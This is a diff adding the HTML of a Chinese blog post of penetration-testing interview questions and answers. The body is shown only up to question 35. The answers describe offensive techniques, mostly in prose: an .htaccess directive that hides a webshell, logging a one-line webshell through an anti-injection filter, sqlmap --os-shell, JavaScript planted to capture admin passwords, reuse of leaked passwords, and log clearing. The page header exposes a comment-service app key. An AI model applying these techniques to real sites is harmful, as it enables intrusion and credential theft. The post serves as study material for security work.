@@ -1,0 +1,1442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title>渗透测试面试问题 | T1h2er3的一亩三分地</title>
+  <meta name="description" content="这是一个菜鸡学习的地方" />
+  <meta name="keywords" content="CTF,WEB,林俊杰" />
+  
+    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/2.jpg">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/googlefont.css" media="all">
+<!--  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">-->
+  <link rel="stylesheet" id="saukra_css-css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/font.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/insight.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "T1h2er3";
+  mashiro_option.author_name = "";
+  mashiro_option.site_url = "https://ther.wang";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/27.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://ther.wang" target="_blank" rel="noopener">
+          <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>不要总在过去的回忆里缠绵，昨天的太阳，晒不干今天的衣裳</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/t1h2er3" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/img/social/email.svg">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  
+  <div id="video-container" style="display: none;">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu" >
+    </div>
+  </div>
+  
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+ 
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">T1h2er3</span>
+            <span class="shironeko"></span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    文章分类
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    兴趣
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          音乐
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/45.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+      </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      渗透测试面试问题</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://ther.wang" target="_blank" rel="noopener">
+            <img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/26.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://ther.wang" target="_blank" rel="noopener">T1h2er3</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-6-2
+        
+      
+        ·<span id="readcount"></span>次阅读
+      
+      </p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <ul>
+<li><a href="#head1"> 思路流程</a><ul>
+<li><a href="#head2"> 信息收集</a></li>
+<li><a href="#head3"> 漏洞挖掘</a></li>
+<li><a href="#head4"> 漏洞利用&amp;权限提升</a></li>
+<li><a href="#head5"> 清除测试数据&amp;输出报告</a></li>
+<li><a href="#head6"> 复测</a></li>
+</ul>
+</li>
+<li><a href="#head7"> 问题</a></li>
+<li><a href="#head8"> 深信服一面:</a></li>
+<li><a href="#head9"> SQL注入防护</a></li>
+<li><a href="#head10"> 为什么参数化查询可以防止sql注入</a></li>
+<li><a href="#head11"> SQL头注入点</a></li>
+<li><a href="#head12"> 盲注是什么？怎么盲注？</a></li>
+<li><a href="#head13"> 宽字节注入产生原理以及根本原因</a><ul>
+<li><a href="#head14"> 产生原理</a></li>
+<li><a href="#head15"> 在哪里编码</a></li>
+<li><a href="#head16"> 根本原因</a></li>
+<li><a href="#head17"> 解决办法</a></li>
+<li><a href="#head18"> sql里面只有update怎么利用</a></li>
+</ul>
+</li>
+<li><a href="#head19"> sql如何写shell/单引号被过滤怎么办</a><ul>
+<li><a href="#head20"> 代替空格的方法</a></li>
+<li><a href="#head21"> mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li>
+</ul>
+</li>
+<li><a href="#head22"> XSS</a><ul>
+<li><a href="#head23"> XSS原理</a><ul>
+<li><a href="#head24"> 反射型</a></li>
+<li><a href="#head25"> 储存型</a></li>
+<li><a href="#head26"> DOM型</a></li>
+</ul>
+</li>
+<li><a href="#head27"> DOM型和反射型的区别</a></li>
+<li><a href="#head28">DOM型XSS 自动化测试或人工测试</a></li>
+<li><a href="#head29"> 如何快速发现xss位置</a></li>
+<li><a href="#head30"> 对于XSS怎么修补建议</a></li>
+<li><a href="#head31"> XSS蠕虫的产生条件</a></li>
+</ul>
+</li>
+<li><a href="#head32"> CSRF</a><ul>
+<li><a href="#head33"> CSRF原理</a></li>
+<li><a href="#head34"> 防御</a></li>
+<li><a href="#head35"> token和referer做横向对比，谁安全等级高？</a></li>
+<li><a href="#head36"> 对referer的验证，从什么角度去做？如果做，怎么杜绝问题</a></li>
+<li><a href="#head37"> 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</a></li>
+</ul>
+</li>
+<li><a href="#head38"> SSRF</a><ul>
+<li><a href="#head39"> 检测</a></li>
+<li><a href="#head40">SSRF漏洞的成因 防御 绕过</a></li>
+</ul>
+</li>
+<li><a href="#head41"> 上传</a><ul>
+<li><a href="#head42"> 文件上传漏洞原理</a></li>
+<li><a href="#head43"> 常见的上传绕过方式</a></li>
+<li><a href="#head44"> 防护</a></li>
+<li><a href="#head45"> 审查上传点的元素有什么意义？</a></li>
+</ul>
+</li>
+<li><a href="#head46"> 文件包含</a><ul>
+<li><a href="#head47"> 原理</a></li>
+<li><a href="#head48"> 导致文件包含的函数</a></li>
+<li><a href="#head49"> 本地文件包含</a></li>
+</ul>
+</li>
+<li><a href="#head50"> XXE</a></li>
+<li><a href="#head51"> 逻辑漏洞</a><ul>
+<li><a href="#head52"> 金融行业常见逻辑漏洞</a></li>
+</ul>
+</li>
+<li><a href="#head53"> 溢出</a></li>
+<li><a href="#head54"> 中间人攻击</a><ul>
+<li><a href="#head55"> ARP欺骗</a><ul>
+<li><a href="#head56"> 原理:</a></li>
+<li><a href="#head57"> 防护</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#head58"> DDOS</a><ul>
+<li><a href="#head59"> Ddos原理</a><ul>
+<li><a href="#head60"> syn洪流的原理</a></li>
+<li><a href="#head61"> CC攻击原理</a></li>
+</ul>
+</li>
+<li><a href="#head62"> DDOS防护</a></li>
+</ul>
+</li>
+<li><a href="#head63"> 提权</a><ul>
+<li><a href="#head64"> mysql两种提权方式</a><ul>
+<li><a href="#head65"> Mysql_UDF提权</a></li>
+<li><a href="#head66">Mysql mof提权</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#head67"> 特殊漏洞</a><ul>
+<li><a href="#head68"> Struts2-045</a></li>
+<li><a href="#head69"> Redis未授权访问</a><ul>
+<li><a href="#head70"> 产生原因</a></li>
+<li><a href="#head71"> 利用条件和方法</a></li>
+<li><a href="#head72"> 修复</a></li>
+</ul>
+</li>
+<li><a href="#head73"> Jenkins未授权访问</a></li>
+<li><a href="#head74"> MongoDB未授权访问</a><ul>
+<li><a href="#head75"> 防护</a></li>
+</ul>
+</li>
+<li><a href="#head76"> Memcache未授权访问</a><ul>
+<li><a href="#head77"> 利用</a></li>
+<li><a href="#head78"> 漏洞加固</a></li>
+</ul>
+</li>
+<li><a href="#head79">FFMPEG 本地文件读取漏洞</a><ul>
+<li><a href="#head80"> 原理</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#head81"> 安全知识</a><ul>
+<li><a href="#head82"> WEB</a><ul>
+<li><a href="#head83"> 常用WEB开发JAVA框架</a></li>
+<li><a href="#head84"> 同源策略</a></li>
+<li><a href="#head85"> Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</a><ul>
+<li><a href="#head86"> 涉及到Jsonp的安全攻防内容</a></li>
+<li><a href="#head87"> 攻击页面</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#head88"> PHP</a><ul>
+<li><a href="#head89"> php中命令执行涉及到的函数</a></li>
+<li><a href="#head90">安全模式下绕过php的disable fuction</a></li>
+<li><a href="#head91"> PHP弱类型</a></li>
+</ul>
+</li>
+<li><a href="#head92"> 数据库</a><ul>
+<li><a href="#head93"> 各种数据库文件存放的位置</a></li>
+</ul>
+</li>
+<li><a href="#head94"> 系统</a><ul>
+<li><a href="#head95"> 如何清理日志</a></li>
+<li><a href="#head96">入侵 Linux 服务器后需要清除哪些日志？</a></li>
+<li><a href="#head97"> LINUX</a><ul>
+<li><a href="#head98">查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</a></li>
+<li><a href="#head99">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</a></li>
+<li><a href="#head100">通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</a></li>
+<li><a href="#head101"> linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</a></li>
+<li><a href="#head102"> 如何一条命令查看文件内容最后一百行</a></li>
+</ul>
+</li>
+<li><a href="#head103"> Windows</a><ul>
+<li><a href="#head104"> 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#head105"> 密码学</a><ul>
+<li><a href="#head106"> AES／DES的具体工作步骤</a></li>
+<li><a href="#head107"> RSA算法</a></li>
+<li><a href="#head108"> 分组密码的加密模式</a></li>
+<li><a href="#head109"> 如何生成一个安全的随机数？</a></li>
+<li><a href="#head110"> SSL握手过程</a></li>
+<li><a href="#head111"> 对称加密与非对称加密的不同，分别用在哪些方面</a></li>
+</ul>
+</li>
+<li><a href="#head112"> TCP/IP</a><ul>
+<li><a href="#head113"> TCP三次握手的过程以及对应的状态转换</a></li>
+<li><a href="#head114"> TCP和UDP协议区别</a></li>
+<li><a href="#head115"> https的建立过程</a></li>
+</ul>
+</li>
+<li><a href="#head116"> 流量分析</a><ul>
+<li><a href="#head117"> wireshark简单的过滤规则</a></li>
+</ul>
+</li>
+<li><a href="#head118"> 防火墙</a><ul>
+<li><a href="#head119"> 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="思路流程"><a href="#思路流程" class="headerlink" title=" 思路流程"></a><span id="head1"> 思路流程</span></h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title=" 信息收集"></a><span id="head2"> 信息收集</span></h3><ol>
+<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
+<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
+<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
+<li>子域名收集，旁站，C段等</li>
+<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
+<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
+<li>传输协议，通用漏洞，exp，github源码等</li>
+</ol>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title=" 漏洞挖掘"></a><span id="head3"> 漏洞挖掘</span></h3><ol>
+<li>浏览网站，看看网站规模，功能，特点等</li>
+<li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li>
+<li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li>
+</ol>
+<h3 id="漏洞利用-amp-权限提升"><a href="#漏洞利用-amp-权限提升" class="headerlink" title=" 漏洞利用&amp;权限提升"></a><span id="head4"> 漏洞利用&amp;权限提升</span></h3><ul>
+<li>mysql提权，serv-u提权，oracle提权</li>
+<li>windows 溢出提权</li>
+<li>linux脏牛,内核漏洞提权e</li>
+</ul>
+<h3 id="清除测试数据-amp-输出报告"><a href="#清除测试数据-amp-输出报告" class="headerlink" title=" 清除测试数据&amp;输出报告"></a><span id="head5"> 清除测试数据&amp;输出报告</span></h3><p>i 日志、测试数据的清理<br>ii 总结，输出渗透测试报告，附修复方案</p>
+<h3 id="复测"><a href="#复测" class="headerlink" title=" 复测"></a><span id="head6"> 复测</span></h3><p>验证并发现是否有新漏洞，输出报告，归档</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title=" 问题"></a><span id="head7"> 问题</span></h2><p><strong>1.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
+<p>​    1) 信息收集<br>​        1. 获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。 用邮箱做关键词进行丢进搜索引擎。 利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。 利用已有信息生成专用字典。<br>​        2. 查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>​        3. 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>​        4. 查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>​        5. 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>​        6. google hack 进一步探测网站的信息，后台，敏感文件    </p>
+<p>​    2) 漏洞扫描<br>​        开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>​        远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等  </p>
+<p>​    3) 漏洞利用<br>​        利用以上的方式拿到webshell，或者其他权限  </p>
+<p>​    4) 权限提升<br>​        提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权  </p>
+<p>​    5) 日志清理  </p>
+<p>​    6) 总结报告及修复方案  </p>
+<p><strong>2.判断出网站的CMS对渗透有什么意义？</strong></p>
+<p>​    查找网上已曝光的程序漏洞。</p>
+<p>​    如果开源，还能下载相对应的源码进行代码审计。</p>
+<p><strong>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</strong></p>
+<p>​    敏感文件、二级目录扫描</p>
+<p>​    站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
+<p><strong>4.常见的网站服务器容器。</strong></p>
+<p>​    IIS、Apache、nginx、Lighttpd、Tomcat</p>
+<p><strong>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p>
+<p>​    root权限以及网站的绝对路径。</p>
+<p><strong>6.目前已知哪些版本的容器有解析漏洞，具体举例。</strong></p>
+<p>​    <strong>IIS 6.0</strong><br>​    /xx.asp/xx.jpg “xx.asp”是文件夹名</p>
+<p>​    IIS 7.0/7.5<br>​    默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p>
+<p>​    Nginx<br>​    版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>​    空字节代码 xxx.jpg.php</p>
+<p>​    Apache<br>​    上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
+<p>​    lighttpd<br>​    xx.jpg/xx.php，<strong>不全,请小伙伴们在评论处不吝补充，谢谢！</strong></p>
+<p><strong>7.如何手工快速判断目标站是windows还是linux服务器？</strong></p>
+<p>​    linux大小写敏感,windows大小写不敏感。</p>
+<p><strong>8.为何一个mysql数据库的站，只有一个80端口开放？</strong></p>
+<p>​    更改了端口，没有扫描出来。</p>
+<p>​    站库分离。</p>
+<p>​    3306端口不对外开放</p>
+<p><strong>9、3389无法连接的几种情况</strong></p>
+<p>​    没开放3389 端口</p>
+<p>​    端口被修改</p>
+<p>​    防护拦截</p>
+<p>​    处于内网(需进行端口转发)</p>
+<p><strong>10.如何突破注入时字符被转义？</strong></p>
+<p>​    宽字符注入</p>
+<p>​    hex编码绕过</p>
+<p><strong>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
+<p>​    查看编辑器的名称版本,然后搜索公开的漏洞。</p>
+<p><strong>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</strong></p>
+<p>​    能做的事情很多，用隐藏网马来举例子：<br>​    插入<br>​    &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </FilesMatch><br>​    .jpg文件会被解析成.php文件。</p>
+<p>​    具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
+<p><strong>13.注入漏洞只能查账号密码？</strong></p>
+<p>​    只要权限广，拖库脱到老。</p>
+<p><strong>14.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
+<p>​    是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
+<p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，**</strong>如何实现到本地利用？**</p>
+<p>​    迅雷下载，直接改后缀为.mdb。</p>
+<p><strong>16.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
+<p>​    因为exp执行多半需要空格界定参数</p>
+<p><strong>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</strong></p>
+<p>​    同数据库。</p>
+<p><strong>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</strong></p>
+<p>​    and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
+<p><strong>19:某个防注入系统，在注入时会提示：</strong></p>
+<p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p>
+<p><strong>20、如何利用这个防注入系统拿shell？</strong></p>
+<p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
+<p><strong>21.上传大马后访问乱码时，有哪些解决办法？</strong></p>
+<p>​    浏览器中改编码。</p>
+<p><strong>22.审查上传点的元素有什么意义？</strong></p>
+<p>​    有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
+<p><strong>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</strong></p>
+<p>​    先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
+<p>​    其实有些站点，在登陆处也会这样提示</p>
+<p>​    所有和数据库有交互的地方都有可能有注入。</p>
+<p><strong>24.目标站发现某txt的下载地址为</strong><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
+<p>​    这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
+<p><strong>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</strong></p>
+<p>​    直接在网站二级目录/abc/下扫描敏感文件及目录。</p>
+<p><strong>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</strong></p>
+<p>​    后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
+<p>​    在登录后才可以访问的文件中插入XSS脚本。</p>
+<p><strong>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</strong></p>
+<p>​    审查元素 把密码处的password属性改成text就明文显示了</p>
+<p><strong>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</strong></p>
+<p>​    原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
+<p><strong>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
+<p>​    在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</p>
+<p><strong>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</strong></p>
+<p>​    隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
+<p><strong>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</strong></p>
+<p>A. demo.jsp?id=2+1       B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
+<p><strong>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</strong></p>
+<p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
+<p><strong>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</strong></p>
+<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
+<p><strong>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</strong></p>
+<p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
+<p><strong>CSRF是跨站请求伪造攻击</strong>，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
+<p><strong>35、CSRF、SSRF和重放攻击有什么区别？</strong></p>
